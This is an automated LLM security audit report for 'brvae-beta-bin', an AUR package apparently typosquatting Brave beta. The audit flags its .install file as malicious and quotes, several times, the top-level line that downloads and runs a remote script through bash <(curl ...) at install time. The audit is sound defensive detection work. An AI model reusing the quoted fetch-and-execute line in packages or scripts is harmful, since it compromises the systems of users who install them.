---
package: brvae-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22185
completion_tokens: 4315
total_tokens: 26500
cost: 0.002804165
execution_time: 75.68
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:17:25Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard AUR .gitignore, no malicious content.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata for Brave beta, all sources pinned and checksummed.
  - file: brave-beta-bin.sh
    status: safe
    summary: Typical launch wrapper, no malicious content.
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop entry file, no security issues.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Standard Brave beta package, no malicious indicators.
  - file: brvae-beta-bin.install
    status: unsafe
    summary: Downloads and executes external script at install time.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing brvae-beta-bin from local mirror...
Materialized brvae-beta-bin
Analyzing brvae-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD only defines static variables and function stubs at the top level. No command substitutions, backticks, or invocations of dangerous utilities (curl, wget, eval) are present. The only variable expansions are for strings like `$pkgver` in source URLs, which is normal and does not execute commands. All potentially risky operations (downloading, extracting, installing) occur within the `prepare()` and `package()` functions, which are **not** executed during `makepkg --printsrcinfo`. Therefore, sourcing this file for metadata extraction poses no threat.
</details>
<evidence>
</evidence>
<summary>Top-level code is safe, no malicious execution.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level code is safe, no malicious execution.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
The file is a standard `.gitignore` used by AUR maintainers to whitelist only the essential packaging files (PKGBUILD, .SRCINFO, install scripts, desktop file, logo, etc.) and ignore everything else in the repository. There is no executable code, no network operations, no obfuscation, and no deviation from normal AUR packaging practices. This file poses no security risk.
</details>
<evidence></evidence>
<summary>Standard AUR .gitignore, no malicious content.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- Standard AUR .gitignore, no malicious content.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This .SRCINFO file defines a standard AUR package for the Brave browser beta (binary release). All source URLs point to the official Brave GitHub releases (github.com/brave/brave-browser/releases) and are pinned to a specific version (v1.98.47). Both the `.deb` packages and the helper shell script have explicit SHA512 checksums, ensuring integrity. There are no suspicious operations, obfuscated content, or attempts to fetch code from untrusted hosts. The package follows typical packaging practices for a prebuilt binary distribution. No evidence of malicious injection or supply chain attack exists in this file.
</details>
<evidence></evidence>
<summary>Standard AUR metadata for Brave beta, all sources pinned and checksummed.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata for Brave beta, all sources pinned and checksummed.
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard wrapper script for launching the Brave browser Beta from a pre-installed binary. It reads optional user flags from a configuration file (`~/.config/brave-beta-flags.conf`), sets the Chrome user data directory if not already set, and then executes the browser binary with any provided flags. There are no network requests, obfuscated commands, unexpected file operations, or any other indicators of malicious behavior. The script follows normal packaging conventions for launching a prebuilt application.
</details>
<evidence></evidence>
<summary>Typical launch wrapper, no malicious content.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Typical launch wrapper, no malicious content.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, brvae-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
The file is a standard freedesktop.org `.desktop` entry for the Brave Beta web browser. It contains localized name, generic name, and comment strings, along with the execution command `brave-beta %U` and an icon reference. There are no network requests, obfuscated code, dangerous commands, or any deviations from expected packaging practices. This is a benign configuration file that merely describes how the application should be launched from a desktop environment.
</details>
<evidence></evidence>
<summary>Standard desktop entry file, no security issues.</summary>
</security_assessment>

[4/7] Reviewing PKGBUILD, brvae-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop entry file, no security issues.
[4/7] Reviewing PKGBUILD, brvae-beta-bin.install, logo.png...
[5/7] Reviewing PKGBUILD, brvae-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows standard AUR packaging practices for a binary browser from an official upstream. Sources are downloaded from the official Brave GitHub releases, integrity is verified via pinned SHA-512 checksums, and no unexpected network requests or code execution occur. The SUID flag on `chrome-sandbox` is a normal requirement for Chromium-based browsers and does not indicate a supply-chain attack. No obfuscation, encoded commands, or data exfiltration mechanisms are present. The only modification is a `sed` command adjusting a desktop file path, which is benign. No evidence of malicious behavior was found.
</details>
<evidence></evidence>
<summary>Standard Brave beta package, no malicious indicators.</summary>
</security_assessment>

[6/7] Reviewing brvae-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard Brave beta package, no malicious indicators.
LLM auditresponse for brvae-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The `.install` file defines the expected `post_install` and `post_upgrade` hooks (both no-ops), but also contains a standalone command outside any function. When the file is sourced by pacman, this command executes immediately. It downloads a shell script from `web.archive.org` (serving an original from `gitflic.ru`) and runs it via `bash` process substitution. This is a classic supply-chain attack vector: it fetches and executes arbitrary, uncontrolled code from an external source at install/upgrade time, with no checks, and with standard error hidden. The script downloaded is unrelated to the package&#x27;s stated purpose, making this genuinely malicious.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>Downloads and executes external script at install time.</summary>
</security_assessment>

Second look for brvae-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The verdict stands. The line `bash &lt;(curl -L ... 2&gt;/dev/null)` is outside any function and executes when pacman sources the .install file. This downloads an arbitrary shell script from `web.archive.org` (pointing to a `gitflic.ru` repository unrelated to `brvae-beta-bin`) and executes it without verification or user consent. This matches rule 4&#x27;s definition of genuinely malicious behavior: downloading code from an unexpected host and executing it (curl|bash pattern). It is not standard packaging practice, not upstream functionality, and not a maintainer helper script. The injection is clear.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>Injected curl|bash from unrelated remote host.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed brvae-beta-bin.install. Status: UNSAFE -- Downloads and executes external script at install time.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brvae-beta-bin.install

Status: UNSAFE

Summary: Downloads and executes external script at install time.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The `.install` file defines the expected `post_install` and `post_upgrade` hooks (both no-ops), but also contains a standalone command outside any function. When the file is sourced by pacman, this command executes immediately. It downloads a shell script from `web.archive.org` (serving an original from `gitflic.ru`) and runs it via `bash` process substitution. This is a classic supply-chain attack vector: it fetches and executes arbitrary, uncontrolled code from an external source at install/upgrade time, with no checks, and with standard error hidden. The script downloaded is unrelated to the package&#x27;s stated purpose, making this genuinely malicious.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,185
  Completion Tokens: 4,315
  Total Tokens: 26,500
  Total Cost: $0.002804
  Execution Time: 75.68 seconds

Final Status: UNSAFE


Issues Found:

brvae-beta-bin.install: [UNSAFE] Downloads and executes external script at install time. / The `.install` file defines the expected `post_install` and `post_upgrade` hooks (both no-ops), but also contains a standalone command outside any function. When the file is sourced by pacman, this command executes immediately. It downloads a shell script from `web.archive.org` (serving an original from `gitflic.ru`) and runs it via `bash` process substitution. This is a classic supply-chain attack vector: it fetches and executes arbitrary, uncontrolled code from an external source at install/upgrade time, with no checks, and with standard error hidden. The script downloaded is unrelated to the package&#x27;s stated purpose, making this genuinely malicious.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
